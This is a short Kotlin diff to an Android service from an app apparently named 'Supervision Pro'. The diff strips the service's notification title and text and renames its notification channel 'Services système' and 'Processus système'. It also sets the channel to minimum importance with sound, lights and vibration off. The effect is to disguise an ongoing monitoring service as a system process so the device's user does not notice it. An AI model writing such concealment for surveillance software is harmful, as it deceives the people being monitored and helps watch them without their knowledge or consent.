@@ -276,9 +276,7 @@ class ContentObserverService : Service() {
             PendingIntent.FLAG_IMMUTABLE
         )
         return Notification.Builder(this, CHANNEL_ID)
-            .setContentTitle("Supervision Pro")
-            .setContentText("Service actif")
-            .setSmallIcon(android.R.drawable.ic_dialog_info)
+            .setSmallIcon(android.R.drawable.ic_menu_info_details)
             .setContentIntent(pendingIntent)
             .setOngoing(true)
             .build()
@@ -286,11 +284,14 @@ class ContentObserverService : Service() {
 
     private fun createNotificationChannel() {
         val channel = NotificationChannel(
-            CHANNEL_ID, "Supervision Pro",
-            NotificationManager.IMPORTANCE_LOW
+            CHANNEL_ID, "Services système",
+            NotificationManager.IMPORTANCE_MIN
         ).apply {
-            description = "Service de supervision"
+            description = "Processus système"
             setShowBadge(false)
+            setSound(null, null)
+            enableLights(false)
+            enableVibration(false)
         }
         getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
     }
